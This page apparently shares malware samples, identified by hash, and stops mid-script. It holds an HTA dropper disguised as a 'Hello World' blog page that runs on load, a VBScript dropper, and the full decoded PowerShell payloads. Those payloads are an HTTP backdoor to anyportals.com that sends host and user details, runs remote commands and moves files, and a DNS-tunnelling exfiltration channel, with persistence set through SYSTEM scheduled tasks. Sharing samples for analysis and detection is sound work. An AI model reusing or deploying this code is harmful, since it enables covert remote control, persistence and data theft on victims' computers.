## Uploaded by @JohnLaTwc
## Sample hashes: 0a047e6e246c17f9e3ab59d2309f5e9b57bb452637e1cba0317b47dc5b371a9c 2110b70616efce94c5d3cd0c5a809f551f716fe6ff7be3556b08f7ad00f2b597

######## 2110b70616efce94c5d3cd0c5a809f551f716fe6ff7be3556b08f7ad00f2b597:
<html>
<head>
<HTA:APPLICATION ID="ResumeForm"  BORDER="thin" BORDERSTYLE="complex" maximizeButton="yes" minimizeButton="yes" />
<script type="text/vbscript">
Sub test()   
Set WshShell = CreateObject("Wscript.Shell")
WshShell.Run "powershell  -windowstyle hidden -nologo -ExecutionPolicy Bypass mkdir C:\ProgramData\Windows\Microsoft\java", 0, true
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base", True)
    a.WriteLine("aWYgKChHZXQtV21pT2JqZWN0IFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAoIkNvbW1hbmRMaW5lIExJS0UgJyUiKyRNeUludm9jYXRpb24uTXlDb21tYW5kLk5hbWUuVHJpbSgpKyIlJyIpKS5sZW5ndGggLWx0IDEwKSB7IA0KICR7Z2xvYmFsOiR3Y30gPSBuZXctb2JqZWN0IHN5c3RlbS5uZXQuV2ViQ2xpZW50IA0KICR7Z2xvYmFsOiR3Y30ucHJveHkgPSBbU3lzdGVtLk5ldC5XZWJQcm94eV06OkdldERlZmF1bHRQcm94eSgpIA0KICRzcnZyID0gImh0dHA6Ly8iICsgW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3Nlcygid3d3LmFueXBvcnRhbHMuY29tIikgKyIvdXBkYXRlX3dhcHAyLmFzcHgiIA0KICRpcCA9IEdldC1XbWlPYmplY3QgLXF1ZXJ5ICJzZWxlY3QgKiBmcm9tIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiB3aGVyZSBJUEVuYWJsZWQgPSAkdHJ1ZSIgfCAleyRfLklQYWRkcmVzc30gDQogJHtnbG9iYWw6JGFpZH0gPSBnZXQtd21pb2JqZWN0IFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdCAgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBVVUlEIHwgJXskXy5yZXBsYWNlKCctJywnJyl9IHwgJXskXyArICIxMjQ1MjQxMzY1MjEifSB8ICV7JF8uc3Vic3RyaW5nKDAsMTIpfSANCiAke2dsb2JhbDokclBhdGh9ID0gJGVudjpQcm9ncmFtRGF0YSArICJcV2luZG93c1xNaWNyb3NvZnRcSmF2YVwiICsgJHtnbG9iYWw6JGFpZH0gDQogZnVuY3Rpb24gc25kcigkZm5hbWUsICRjbnQpeyANCiAJJGFkciA9IGFkckN0ICIkZm5hbWUiICIyIiANCiAJd3JpdGUtaG9zdCAkYWRyIA0KIAl3cml0ZS1ob3N0ICRjbnQgDQogCSR7Z2xvYmFsOiR3Y30uVXBsb2FkU3RyaW5nKCRhZHIsIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkRlZmF1bHQuR2V0Qnl0ZXMoJGNudCkpKSANCiB9IA0KIGZ1bmN0aW9uIGFkckN0KCRyaWRJbiwgJGFjKXsgDQogCSRjciA9IEAoKSANCiAJJGRhciA9IEAoKSANCiAJJGRhciA9IC1qb2luIChHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMCAuLiA5KSAtQ291bnQgMTUpIA0KIAkkY3IgPSBHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMCAuLiA5KSAtQ291bnQgMiANCiAJJGRhciA9ICRkYXIuSW5zZXJ0KCRjclswXSwgJHJpZEluLlRyaW0oKSkuSW5zZXJ0KCgkY3JbMV0pLCAke2dsb2JhbDokYWlkfSkgDQogCSRhZHIgPSAiJCgkc3J2cik/dmVyc2lvbj0kKCRkYXIpNSQoJGFjKTckKCRjclswXSkkKCRjclsxXSkiIA0KIAlyZXR1cm4gJGFkciANCiB9IA0KIGlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJHtnbG9iYWw6JHJQYXRofSkpIA0KIHsgDQogCU5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJHtnbG9iYWw6JHJQYXRofTsgDQogCXNuZHIgJzEyMTIxMjEyMTIxJyAiJCgkZW52OkNPTVBVVEVSTkFNRSkvJCgkZW52OlVTRVJOQU1FKTw+JCgkaXApIjsgDQogfSANCiAkYWRyID0gYWRyQ3QgIjI0MzUxMjQzNTEwIiAiMCIgDQogJHJpZCA9ICR7Z2xvYmFsOiR3Y30uRG93bmxvYWRTdHJpbmcoJGFkcikgDQogaWYgKCRyaWQpeyANCiAJaWYgKCRyaWQubGVuZ3RoIC1lcSAxMSl7IA0KIAkJJGFkciA9IGFkckN0ICIkcmlkIiAiMSIgDQogCQkkciA9ICR7Z2xvYmFsOiR3Y30uRG93bmxvYWRTdHJpbmcoJGFkcikgDQogCQkkcmNudCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkRlZmF1bHQuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHIpKSANCiAJCSRhZHIgPSBhZHJDdCAiJHJpZCIgIjMiIA0KIAkJJHtnbG9iYWw6JHdjfS5Eb3dubG9hZFN0cmluZygkYWRyKSANCiAJCWlmICgkcmlkLkVuZHNXaXRoKCIwIikpeyANCiAJCQkkcmNudCA9ICRyY250IHwgPyB7ICRfLnRyaW0oKSAtbmUgIiIgfSANCiAJCQkkcmVzICs9ICRyY250LlNwbGl0KCImIikgfCBmb3JlYWNoLW9iamVjdCB7ICRfIHwgaWV4IHwgT3V0LVN0cmluZyB9IA0KIAkJCXNuZHIgJHJpZCAkcmVzIA0KIAkJfSANCiAJCWVsc2VpZiAoJHJpZC5FbmRzV2l0aCgiMSIpKXsgDQogCQkJJGFkciA9ICRyY250LlRyaW0oKSANCiAJCQlpZiAoVGVzdC1QYXRoIC1QYXRoICRhZHIpIA0KIAkJCXsgDQogCQkJCSRhZHJTID0gYWRyQ3QgIiRyaWQiICI0IiANCiAJCQkJJHtnbG9iYWw6JHdjfS5VcGxvYWRGaWxlKCRhZHJTLCAkYWRyKSANCiAJCQl9IA0KIAkJCWVsc2UgDQogCQkJeyANCiAJCQkJc25kciAkcmlkICI0MDQiIA0KIAkJCX0gDQogCQl9IA0KIAkJZWxzZWlmICgkcmlkLkVuZHNXaXRoKCIyIikpeyANCiAJCQlpZigtbm90KFRlc3QtUGF0aCAiJHtnbG9iYWw6JHJQYXRofVxmaWxlc1wiKSkge21kICIke2dsb2JhbDokclBhdGh9XGZpbGVzXCI7fSANCiAJCQkkc2F2QWRyID0gIiR7Z2xvYmFsOiRyUGF0aH1cZmlsZXNcIiskcmNudC50cmltKCk7IA0KIAkJCSRhZHJTID0gYWRyQ3QgIiRyaWQiICI1IiANCiAJCQkke2dsb2JhbDokd2N9LkRvd25sb2FkRmlsZSgkYWRyUywgJHNhdkFkcikgDQogCQkJc25kciAkcmlkICIyMDA8PiRzYXZBZHIiIA0KIAkJfSANCiAJfSANCiB9IA0KIH0=")
    a.Close
Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base", True)
    a.WriteLine("")
    a.Close
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs", True)
    a.WriteLine("set Shell0 = CreateObject(""wscript.shell"")" & vbCrLf & "Shell0.run ""powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1 "", 0, false" & vbCrLf & "command1 = ""Powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1""" & vbCrLf & "set Shell1 = CreateObject(""wscript.shell"")" & vbCrLf & "shell1.run command1, 0, false")
    a.Close
	Set a = fs.CreateTextFile("C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat", True)
    a.WriteLine("@schtasks /create /F /sc minute /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs""""" & vbCrLf & "@schtasks /create /F /sc minute /RU ""SYSTEM"" /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs""""")
    a.Close
		WshShell.run "cmd.exe /C certutil -f  -decode C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1", 0,true
		WshShell.run "cmd.exe /C certutil -f  -decode C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1", 0,true
		WshShell.run "cmd.exe /C C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat&ping 127.0.0.1 -n 6 > nul&wscript  /b C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs", 0,true
		WshShell.run "cmd.exe /C del C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat &  del C:\ProgramData\Windows\Microsoft\java\*.base", 0,false
End Sub
</script>
<title>Blog.tkacprow.pl: HTA Hello World!</title>
</head>
<body onload="test()">
<table width="100%">
    <tr>
        <td>
            <!--Your content here!-->
            <H1>Hello World!</H1>

        </td>
    </tr>
</table>
</body>
</html>

######## 0a047e6e246c17f9e3ab59d2309f5e9b57bb452637e1cba0317b47dc5b371a9c:
Dim oFSO
Dim oShell
Set oShell = WScript.CreateObject ("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")
Dim objFso
Set objFso = WScript.CreateObject("Scripting.FileSystemObject")
If Not objFso.FolderExists("C:\ProgramData\Windows") Then
  objFso.CreateFolder "C:\ProgramData\Windows"
End If
If Not objFso.FolderExists("C:\ProgramData\Windows\Microsoft") Then
  objFso.CreateFolder "C:\ProgramData\Windows\Microsoft"
End If
If Not objFso.FolderExists("C:\ProgramData\Windows\Microsoft\java") Then
  objFso.CreateFolder "C:\ProgramData\Windows\Microsoft\java"
End If 
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs") Then
	outFile = "C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs"
	Set objFile = objFSO.CreateTextFile(outFile,True)
	objFile.Write "set Shell0 = CreateObject(""wscript.shell"")" & vbCrLf & "Shell0.run ""powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1 "", 0, false" & vbCrLf & "command1 = ""Powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1""" & vbCrLf & "set Shell1 = CreateObject(""wscript.shell"")" & vbCrLf & "shell1.run command1, 0, false" 
	objFile.Close
End If
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base") Then
	code2 = "aWYgKChHZXQtV21pT2JqZWN0IFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAoIkNvbW1hbmRMaW5lIExJS0UgJyUiKyRNeUludm9jYXRpb24uTXlDb21tYW5kLk5hbWUuVHJpbSgpKyIlJyIpKS5sZW5ndGggLWx0IDEwKSB7IA0KICR7Z2xvYmFsOiR3Y30gPSBuZXctb2JqZWN0IHN5c3RlbS5uZXQuV2ViQ2xpZW50IA0KICR7Z2xvYmFsOiR3Y30ucHJveHkgPSBbU3lzdGVtLk5ldC5XZWJQcm94eV06OkdldERlZmF1bHRQcm94eSgpIA0KICRzcnZyID0gImh0dHA6Ly8iICsgW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3Nlcygid3d3LmFueXBvcnRhbHMuY29tIikgKyIvdXBkYXRlX3dhcHAyLmFzcHgiIA0KICRpcCA9IEdldC1XbWlPYmplY3QgLXF1ZXJ5ICJzZWxlY3QgKiBmcm9tIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiB3aGVyZSBJUEVuYWJsZWQgPSAkdHJ1ZSIgfCAleyRfLklQYWRkcmVzc30gDQogJHtnbG9iYWw6JGFpZH0gPSBnZXQtd21pb2JqZWN0IFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdCAgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBVVUlEIHwgJXskXy5yZXBsYWNlKCctJywnJyl9IHwgJXskXyArICIxMjQ1MjQxMzY1MjEifSB8ICV7JF8uc3Vic3RyaW5nKDAsMTIpfSANCiAke2dsb2JhbDokclBhdGh9ID0gJGVudjpQcm9ncmFtRGF0YSArICJcV2luZG93c1xNaWNyb3NvZnRcSmF2YVwiICsgJHtnbG9iYWw6JGFpZH0gDQogZnVuY3Rpb24gc25kcigkZm5hbWUsICRjbnQpeyANCiAJJGFkciA9IGFkckN0ICIkZm5hbWUiICIyIiANCiAJd3JpdGUtaG9zdCAkYWRyIA0KIAl3cml0ZS1ob3N0ICRjbnQgDQogCSR7Z2xvYmFsOiR3Y30uVXBsb2FkU3RyaW5nKCRhZHIsIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkRlZmF1bHQuR2V0Qnl0ZXMoJGNudCkpKSANCiB9IA0KIGZ1bmN0aW9uIGFkckN0KCRyaWRJbiwgJGFjKXsgDQogCSRjciA9IEAoKSANCiAJJGRhciA9IEAoKSANCiAJJGRhciA9IC1qb2luIChHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMCAuLiA5KSAtQ291bnQgMTUpIA0KIAkkY3IgPSBHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMCAuLiA5KSAtQ291bnQgMiANCiAJJGRhciA9ICRkYXIuSW5zZXJ0KCRjclswXSwgJHJpZEluLlRyaW0oKSkuSW5zZXJ0KCgkY3JbMV0pLCAke2dsb2JhbDokYWlkfSkgDQogCSRhZHIgPSAiJCgkc3J2cik/dmVyc2lvbj0kKCRkYXIpNSQoJGFjKTckKCRjclswXSkkKCRjclsxXSkiIA0KIAlyZXR1cm4gJGFkciANCiB9IA0KIGlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJHtnbG9iYWw6JHJQYXRofSkpIA0KIHsgDQogCU5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJHtnbG9iYWw6JHJQYXRofTsgDQogCXNuZHIgJzEyMTIxMjEyMTIxJyAiJCgkZW52OkNPTVBVVEVSTkFNRSkvJCgkZW52OlVTRVJOQU1FKTw+JCgkaXApIjsgDQogfSANCiAkYWRyID0gYWRyQ3QgIjI0MzUxMjQzNTEwIiAiMCIgDQogJHJpZCA9ICR7Z2xvYmFsOiR3Y30uRG93bmxvYWRTdHJpbmcoJGFkcikgDQogaWYgKCRyaWQpeyANCiAJaWYgKCRyaWQubGVuZ3RoIC1lcSAxMSl7IA0KIAkJJGFkciA9IGFkckN0ICIkcmlkIiAiMSIgDQogCQkkciA9ICR7Z2xvYmFsOiR3Y30uRG93bmxvYWRTdHJpbmcoJGFkcikgDQogCQkkcmNudCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkRlZmF1bHQuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHIpKSANCiAJCSRhZHIgPSBhZHJDdCAiJHJpZCIgIjMiIA0KIAkJJHtnbG9iYWw6JHdjfS5Eb3dubG9hZFN0cmluZygkYWRyKSANCiAJCWlmICgkcmlkLkVuZHNXaXRoKCIwIikpeyANCiAJCQkkcmNudCA9ICRyY250IHwgPyB7ICRfLnRyaW0oKSAtbmUgIiIgfSANCiAJCQkkcmVzICs9ICRyY250LlNwbGl0KCImIikgfCBmb3JlYWNoLW9iamVjdCB7ICRfIHwgaWV4IHwgT3V0LVN0cmluZyB9IA0KIAkJCXNuZHIgJHJpZCAkcmVzIA0KIAkJfSANCiAJCWVsc2VpZiAoJHJpZC5FbmRzV2l0aCgiMSIpKXsgDQogCQkJJGFkciA9ICRyY250LlRyaW0oKSANCiAJCQlpZiAoVGVzdC1QYXRoIC1QYXRoICRhZHIpIA0KIAkJCXsgDQogCQkJCSRhZHJTID0gYWRyQ3QgIiRyaWQiICI0IiANCiAJCQkJJHtnbG9iYWw6JHdjfS5VcGxvYWRGaWxlKCRhZHJTLCAkYWRyKSANCiAJCQl9IA0KIAkJCWVsc2UgDQogCQkJeyANCiAJCQkJc25kciAkcmlkICI0MDQiIA0KIAkJCX0gDQogCQl9IA0KIAkJZWxzZWlmICgkcmlkLkVuZHNXaXRoKCIyIikpeyANCiAJCQlpZigtbm90KFRlc3QtUGF0aCAiJHtnbG9iYWw6JHJQYXRofVxmaWxlc1wiKSkge21kICIke2dsb2JhbDokclBhdGh9XGZpbGVzXCI7fSANCiAJCQkkc2F2QWRyID0gIiR7Z2xvYmFsOiRyUGF0aH1cZmlsZXNcIiskcmNudC50cmltKCk7IA0KIAkJCSRhZHJTID0gYWRyQ3QgIiRyaWQiICI1IiANCiAJCQkke2dsb2JhbDokd2N9LkRvd25sb2FkRmlsZSgkYWRyUywgJHNhdkFkcikgDQogCQkJc25kciAkcmlkICIyMDA8PiRzYXZBZHIiIA0KIAkJfSANCiAJfSANCiB9IA0KIH0="
	outFile2 = "C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base"
	Set objFile2 = objFSO.CreateTextFile(outFile2,True)
	objFile2.Write  code2
	objFile2.Close
End If
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base") Then
	code3=""
	outFile3 = "C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base"
	Set objFile3 = objFSO.CreateTextFile(outFile3,True)
	objFile3.Write  code3
	objFile3.Close
End if
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat") Then
		code4="@schtasks /create /F /sc minute /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs""""NEXTLINE@schtasks /create /F /sc minute /RU ""SYSTEM"" /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs"""""
		code4 = Replace(code4, "NEXTLINE", vbCrLf)
		outFile4 = "C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat"
		Set objFile4 = objFSO.CreateTextFile(outFile4,True)
		objFile4.Write  code4
		objFile4.Close
		oShell.run "cmd.exe /C certutil -f  -decode C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1", 0,false
		oShell.run "cmd.exe /C certutil -f  -decode C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1", 0,false
		oShell.run "cmd.exe /C C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat", 0,false
		oShell.run "cmd.exe /C wscript  /b C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs", 0,false
		WScript.Sleep(5000)
		oShell.run "cmd.exe /C del C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat", 0,false		
		oShell.run "cmd.exe /C del C:\ProgramData\Windows\Microsoft\java\*.base", 0,false
End If

######## code2 decodes to:
if ((Get-WmiObject Win32_Process -Filter ("CommandLine LIKE '%"+$MyInvocation.MyCommand.Name.Trim()+"%'")).length -lt 10) { 
 ${global:$wc} = new-object system.net.WebClient 
 ${global:$wc}.proxy = [System.Net.WebProxy]::GetDefaultProxy() 
 $srvr = "http://" + [System.Net.Dns]::GetHostAddresses("www.anyportals.com") +"/update_wapp2.aspx" 
 $ip = Get-WmiObject -query "select * from Win32_NetworkAdapterConfiguration where IPEnabled = $true" | %{$_.IPaddress} 
 ${global:$aid} = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID | %{$_.replace('-','')} | %{$_ + "124524136521"} | %{$_.substring(0,12)} 
 ${global:$rPath} = $env:ProgramData + "\Windows\Microsoft\Java\" + ${global:$aid} 
 function sndr($fname, $cnt){ 
 	$adr = adrCt "$fname" "2" 
 	write-host $adr 
 	write-host $cnt 
 	${global:$wc}.UploadString($adr, [System.Convert]::ToBase64String([System.Text.Encoding]::Default.GetBytes($cnt))) 
 } 
 function adrCt($ridIn, $ac){ 
 	$cr = @() 
 	$dar = @() 
 	$dar = -join (Get-Random -InputObject (0 .. 9) -Count 15) 
 	$cr = Get-Random -InputObject (0 .. 9) -Count 2 
 	$dar = $dar.Insert($cr[0], $ridIn.Trim()).Insert(($cr[1]), ${global:$aid}) 
 	$adr = "$($srvr)?version=$($dar)5$($ac)7$($cr[0])$($cr[1])" 
 	return $adr 
 } 
 if (-not (Test-Path -Path ${global:$rPath})) 
 { 
 	New-Item -ItemType Directory -Path ${global:$rPath}; 
 	sndr '12121212121' "$($env:COMPUTERNAME)/$($env:USERNAME)<>$($ip)"; 
 } 
 $adr = adrCt "24351243510" "0" 
 $rid = ${global:$wc}.DownloadString($adr) 
 if ($rid){ 
 	if ($rid.length -eq 11){ 
 		$adr = adrCt "$rid" "1" 
 		$r = ${global:$wc}.DownloadString($adr) 
 		$rcnt = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($r)) 
 		$adr = adrCt "$rid" "3" 
 		${global:$wc}.DownloadString($adr) 
 		if ($rid.EndsWith("0")){ 
 			$rcnt = $rcnt | ? { $_.trim() -ne "" } 
 			$res += $rcnt.Split("&") | foreach-object { $_ | iex | Out-String } 
 			sndr $rid $res 
 		} 
 		elseif ($rid.EndsWith("1")){ 
 			$adr = $rcnt.Trim() 
 			if (Test-Path -Path $adr) 
 			{ 
 				$adrS = adrCt "$rid" "4" 
 				${global:$wc}.UploadFile($adrS, $adr) 
 			} 
 			else 
 			{ 
 				sndr $rid "404" 
 			} 
 		} 
 		elseif ($rid.EndsWith("2")){ 
 			if(-not(Test-Path "${global:$rPath}\files\")) {md "${global:$rPath}\files\";} 
 			$savAdr = "${global:$rPath}\files\"+$rcnt.trim(); 
 			$adrS = adrCt "$rid" "5" 
 			${global:$wc}.DownloadFile($adrS, $savAdr) 
 			sndr $rid "200<>$savAdr" 
 		} 
 	} 
 } 
 }

######## code3 decodes to:
${global:$address} = "anyportals.com"; 
 ${global:$aidsss} = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID | %{$_.replace('-','')} | %{$_ + "124524136521"} | %{$_.substring(0,12)} 
 ${global:$myPathsss} = $MyInvocation.MyCommand.Path; 
 ${global:$exception_countersss} = 0; 
 ${global:$exception_count_limitsss} = 2; 
 function AdrGen 
 { 
 	param ($part_nosss, $actionsss, $datasss, $file_namesss, $sender_or_receiversss) 
 	$extra_randsss = -join ((48 .. 57)+(65 .. 70) | Get-Random  -Count (%{ Get-Random -InputObject (1 .. 7) }) | %{ [char]$_ }); 
 	$ctrl_random_placesss = Get-Random -InputObject (0 .. 9) -Count 2; 
 	$control_data_and_randsss = ${global:$aidsss}.Insert(($ctrl_random_placesss[1]), $actionsss).Insert($ctrl_random_placesss[0], $part_nosss); 
 	if ($sender_or_receiversss -eq "s") 
 	{ 
 		return "$($control_data_and_randsss)$($extra_randsss)A$($ctrl_random_placesss[0])$($ctrl_random_placesss[1])7.$datasss.$file_namesss.${global:$address}"; 
 	} 
 	else 
 	{ 
 		return "$($control_data_and_randsss)$($extra_randsss)A$($ctrl_random_placesss[0])$($ctrl_random_placesss[1])7.$(${global:$address})"; 
 	} 
 } 
 function receive 
 { 
 	$saveing_moodsss = $false; 
 	$countersss = 0; 
 	$save_path = ${global:$receive_box} + "\"; 
 	$fetched_bytessss = @(); 
 	$req_no = "000"; 
 	$action = "0"; 
 	${global:$run} = $true; 
 	${global:$exception_countersss} = 0; 
 	While (${global:$run}) 
 	{ 
 		if (${global:$exception_countersss} -gt ${global:$exception_count_limitsss}) { break } 
 		Start-Sleep -m 50; 
 		if ($countersss -lt 10) { $req_no = "00$($countersss)"; } 
 		elseif ($countersss -lt 100) { $req_no = "0$($countersss)"; } 
 		else { $req_no = "$($countersss)"; } 
 		$lastAddress = AdrGen $req_no $action "" "" "r" 
 		try 
 		{ 
 			Write-Host $lastAddress; 
 			$resultTmp = [System.Net.Dns]::GetHostAddresses($lastAddress); 
 			Write-Host $resultTmp; 
 		} 
 		catch [Exception] 
 		{ 
 			echo $_.Exception.GetType().FullName, $_.Exception.Message; Write-Host "excepton occured!"; ${global:$exception_countersss} = ${global:$exception_countersss} + 1; continue; 
 		} 
 		if ($resultTmp -eq $null) 
 		{ 
 			${global:$exception_countersss} = ${global:$exception_countersss} + 1; 
 			continue; 
 		} 
 		$result = $resultTmp[0].IPAddressToString; 
 		$result_spilitedsss = $result.Split('.'); 
 		Write-Host "$($countersss):$($result_spilitedsss[3])`tsaveing_mode: $($saveing_moodsss)`t   $($result_spilitedsss[0]) $($result_spilitedsss[1]) $($result_spilitedsss[2])" 
 		if (($result_spilitedsss[0] -eq 1) -and ($result_spilitedsss[1] -eq 2) -and ($result_spilitedsss[2] -eq 3)) 
 		{ 
 			$saveing_moodsss = $false; 
 			$action = "0"; 
 			$len = $fetched_bytessss.Length 
 			if ($fetched_bytessss[$len-1] -eq 0 -and $fetched_bytessss[$len-2] -eq 0) 
 			{ 
 				$fetchTmp = $fetched_bytessss[0 .. ($len - 3)]; 
 			} 
 			elseif ($fetched_bytessss[$len - 1] -eq 0) 
 			{ 
 				$fetchTmp = $fetched_bytessss[0 .. ($len - 2)]; 
 			} 
 			else 
 			{ 
 				$fetchTmp = $fetched_bytessss; 
 			} 
 			[System.IO.File]::WriteAllBytes($save_path, $fetchTmp); 
 			$fetched_bytessss = @(); 
 			$fetchTmp = @(); 
 			$countersss = 0; 
 			${global:$run} = $false; 
 		} 
 		if ($saveing_moodsss) 
 		{ 
 			if ($countersss -gt 250) { $countersss = 0; } 
 			if ($countersss -eq $result_spilitedsss[3]) 
 			{ 
 				$fetched_bytessss += $result_spilitedsss[0]; 
 				$fetched_bytessss += $result_spilitedsss[1]; 
 				$fetched_bytessss += $result_spilitedsss[2]; 
 				$countersss = $countersss + 3; 
 			} 
 		} 
 		if (($result_spilitedsss[0] -eq 24) -and ($result_spilitedsss[1] -eq 125)) 
 		{ 
 			$save_path += $result_spilitedsss[2] + "" + $result_spilitedsss[3]; 
 			$saveing_moodsss = $true; 
 			$action = "1"; 
 			$countersss = 0; 
 		} 
 		if (($result_spilitedsss[0] -eq 11) -and ($result_spilitedsss[1] -eq 24) -and ($result_spilitedsss[2] -eq 237) -and ($result_spilitedsss[3] -eq 110)) # kill this process 
 		{ 
 			${global:$run} = $false; 
 			${global:$exception_countersss} = ${global:$exception_countersss} + 1; 
 		} 
 	} 
 	Start-Sleep -s 1; 
 } 
 function send 
 { 
 	$countersss = 0; 
 	$files_list = @(Get-ChildItem -Path ${global:$send_box} | Where-Object { !$_.PSIsContainer }); 
 	if ($files_list -ne $null) 
 	{ 
 		$tmpAddress = ${global:$send_box} + "\" + $files_list[0]; 
 		$sendingBytes = slaber $tmpAddress; 
 		if ([int]$sendingBytes.Length -le 0) 
 		{ 
 			Remove-Item -Path $tmpAddress; 
 			return; 
 		} 
 		$chunk_size = 60; 
 		$sendingFileNamesss = "*" * 54; 
 		$sendingFileNamesss = Split-Path $tmpAddress -Leaf | % { $sendingFileNamesss.Insert(0, $_) } | % { $_.Insert(6, $sendingBytes.Length) } | %{$_[0..26] -join ""}; 
 		$sendingFileNamesss = -join ($sendingFileNamesss | % { resolver $_ }) 
 		$fileBeginning = "bWV0YT" + $sendingFileNamesss; 
 		$sendingBytes = $fileBeginning + $sendingBytes; 
 		$fileChunkCounts = [int]$sendingBytes.Length / [int]$chunk_size; 
 		$ack_no = "000"; 
 		$action = "2"; 
 		$bulk = 0; 
 		${global:$run} = $true; 
 		${global:$exception_countersss} = 0; 
 		While (${global:$run}) 
 		{ 
 			if (${global:$exception_countersss} -gt ${global:$exception_count_limitsss}) { break; } 
 			Start-Sleep -m 50; 
 			if ($countersss -eq 250) { $countersss = 0; $bulk += 250; } 
 			if ($countersss -lt 10) { $ack_no = "00$($countersss)"; } 
 			elseif ($countersss -lt 100) { $ack_no = "0$($countersss)"; } 
 			else { $ack_no = "$($countersss)"; } 
 			 
 			if ($sendingBytes.Length -gt $chunk_size) 
 			{ 
 				if (($sendingBytes.Length - $chunk_size * ($countersss + $bulk)) -ge $chunk_size) 
 				{ 
 					$currentChunk = $sendingBytes.Substring($chunk_size * ($countersss + $bulk), $chunk_size); 
 				} 
 				elseif (($sendingBytes.Length - $chunk_size * ($countersss + $bulk)) -gt 0) 
 				{ 
 					$currentChunk = $sendingBytes.Substring($chunk_size * ($countersss + $bulk), ($sendingBytes.Length - $chunk_size * ($countersss + $bulk))); 
 				} 
 				else 
 				{ 
 					$currentChunk = "bWV0YTZW5k"; 
 					${global:$run} = $false; 
 					Remove-Item -path $tmpAddress -Force; 
 				} 
 			} 
 			else 
 			{ 
 				$currentChunk = $sendingBytes; 
 			} 
 			$fileNameSendingTmpsss = (Split-Path $tmpAddress -Leaf) + "*" | % { resolver $_ }; 
 			$lastAddress = AdrGen $ack_no $action $currentChunk $fileNameSendingTmpsss "s" 
